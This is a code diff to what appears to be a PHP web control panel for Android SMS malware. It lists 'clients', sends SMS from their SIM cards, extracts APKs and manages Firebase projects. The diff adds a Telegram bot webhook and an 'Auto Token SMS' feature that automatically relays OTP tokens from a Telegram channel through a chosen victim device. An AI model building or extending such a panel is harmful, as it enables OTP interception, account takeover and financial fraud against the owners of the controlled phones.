@@ -40,6 +40,19 @@ if (isset($_GET['rebel_apk_extract']) || isset($_POST['rebel_apk_extract'])) {
   rebel_apk_extract_api_handle();
 }
 
+if (isset($_GET['rebel_sms_token_api']) || isset($_POST['rebel_sms_token_api'])) {
+  rebel_sms_token_api_handle();
+}
+
+if (isset($_GET['rebel_bot_webhook'])) {
+  $raw = file_get_contents('php://input');
+  $update = json_decode($raw ?: '{}', true);
+  if (is_array($update)) {
+    rebel_bot_handle_update($update);
+  }
+  rebel_json_out(['ok' => true]);
+}
+
 header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 ?>
@@ -135,6 +148,18 @@ body{
 .sms-meta{font-size:12px;font-weight:700;color:var(--muted);margin-top:6px}
 .toast-wrap{position:fixed;top:12px;left:12px;right:12px;z-index:200;pointer-events:none}
 .toast{padding:12px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:13px;margin-bottom:8px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+.token-row{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:12px;margin:8px 0;border-radius:12px;background:#fff;border:1px solid var(--card-border);cursor:pointer;touch-action:manipulation;font-weight:700;font-size:14px}
+.token-row .sub{display:block;color:var(--muted);font-size:11px;font-weight:400;margin-top:4px;line-height:1.3}
+.toggle{width:48px;height:28px;border-radius:100px;background:#bbb;position:relative;flex-shrink:0;transition:background .2s}
+.toggle.on{background:var(--online)}
+.toggle::after{content:'';position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;transition:transform .2s;box-shadow:0 1px 3px rgba(0,0,0,.2)}
+.toggle.on::after{transform:translateX(20px)}
+.token-status{font-size:12px;padding:0 4px 10px;color:var(--muted);line-height:1.45}
+.token-log-wrap{max-height:200px;overflow-y:auto;margin:8px 0;-webkit-overflow-scrolling:touch}
+.token-log{font-size:12px;padding:8px 10px;margin:4px 0;border-radius:10px;background:#fff;border:1px solid var(--card-border);word-break:break-word;line-height:1.35}
+.token-log.ok{border-color:var(--online)}
+.token-log.bad{border-color:var(--offline);color:var(--detail)}
+.empty-mini{padding:14px;text-align:center;color:var(--muted);font-size:13px}
 </style>
 </head>
 <body>
@@ -145,6 +170,7 @@ body{
     <div class="hdr-row">
       <span style="width:40px"></span>
       <div class="hdr-title" id="totalClients">Total Clients:-</div>
+      <button type="button" class="icon-btn" onclick="openAutoTokenSheet()" title="Auto Token">⚡</button>
       <button type="button" class="icon-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
     </div>
     <div class="btn-row">
@@ -277,6 +303,7 @@ body{
   <div class="sim-row">
     <button type="button" class="nya-btn" onclick="sendDeviceSms(1)">Sim1</button>
     <button type="button" class="nya-btn" onclick="sendDeviceSms(2)">Sim2</button>
+    <button type="button" class="nya-btn" onclick="useSelForAutoToken()">⚡ Auto Token</button>
   </div>
   <div class="search-row">
     <input class="search-box" id="searchDevice" placeholder="Search clients..." oninput="renderDeviceSmsList()"/>
@@ -296,6 +323,22 @@ body{
   <input id="fbAddUrl" placeholder="https://xxx.firebaseio.com"/>
   <input id="fbAddApiKey" placeholder="API key (optional)"/>
   <button type="button" class="nya-btn wide" onclick="addFirebaseProject()">+ Add Firebase</button>
+</div>
+
+<div class="sheet-bg" id="tokenSheetBg" onclick="closeAutoTokenSheet()"></div>
+<div class="sheet" id="autoTokenSheet">
+  <h3>⚡ Auto Token SMS</h3>
+  <div class="token-status" id="autoTokenStatus">Telegram channel se SMS TOKEN aate hi auto-send hoga</div>
+  <div class="token-row" onclick="toggleAutoToken()">
+    <div>Auto Token SMS<div class="sub">Channel / message se OTP auto bhejo</div></div>
+    <div class="toggle" id="autoTokenToggle"></div>
+  </div>
+  <div class="token-row" onclick="useSelForAutoToken()">
+    <div>Set Device<div class="sub" id="autoTokenDevice">Koi device select nahi</div></div>
+    <span>📱</span>
+  </div>
+  <button type="button" class="nya-btn wide" onclick="refreshAutoTokenLog()">↻ Refresh Log</button>
+  <div class="token-log-wrap" id="autoTokenLog"><div class="empty-mini">No activity yet</div></div>
 </div>
 
 <script>var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;</script>
